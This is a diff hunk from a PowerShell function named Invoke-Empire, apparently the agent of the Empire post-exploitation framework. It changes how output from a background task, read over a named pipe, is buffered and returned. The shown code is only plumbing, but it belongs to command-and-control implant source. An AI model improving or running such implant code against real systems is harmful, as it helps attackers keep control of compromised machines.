@@ -1213,31 +1213,31 @@ function Invoke-Empire {
 
                     $scriptString = {
                         param($pipeServerStream, $ps, $task)
-                            try
-                            {
-                                $outputCollector = [Text.StringBuilder]::new()
-                                $streamReader = New-Object System.IO.StreamReader($pipeServerStream)
-                                $readyMessage = $streamReader.ReadLine()
-                                $buffer = [char[]]::new($pipeServerStream.InBufferSize)
+                        try {
+                            $outputCollector = [Text.StringBuilder]::new()
+                            $streamReader = New-Object System.IO.StreamReader($pipeServerStream)
+                            $readyMessage = $streamReader.ReadLine()
+                            $buffer = [char[]]::new($pipeServerStream.InBufferSize)
 
-                                if ($readyMessage -eq "ready") {
-                                    while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
-                                        $outputChunk = (-join $buffer[0..($read - 1)])
-
-                                        [void]$outputCollector.AppendLine($outputChunk)
-
-                                        $output = $outputCollector.ToString().TrimEnd()
-                                        if (-not [string]::IsNullOrWhiteSpace($output)) {
-                                            $output
-                                        }
-                                        [void]$outputCollector.Clear()
+                            if ($readyMessage -eq "ready") {
+                                while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
+                                    if ($read -gt 0) {
+                                        $outputChunk = -join $buffer[0..($read - 1)]
+                                        [void]$outputCollector.Append($outputChunk)
                                     }
                                 }
+
+                                # Send full output after pipe closes
+                                $output = $outputCollector.ToString().TrimEnd()
+                                if (-not [string]::IsNullOrWhiteSpace($output)) {
+                                    $output
+                                }
                             }
-                            finally {
-                                $ps.EndInvoke($task)
-                                $script:tasks[$ResultID]['status'] = 'completed';
-                            }
+                        }
+                        finally {
+                            $ps.EndInvoke($task)
+                            $script:tasks[$ResultID]['status'] = 'completed';
+                        }
                     }
 
                     $AppDomain = [AppDomain]::CreateDomain($ResultID);
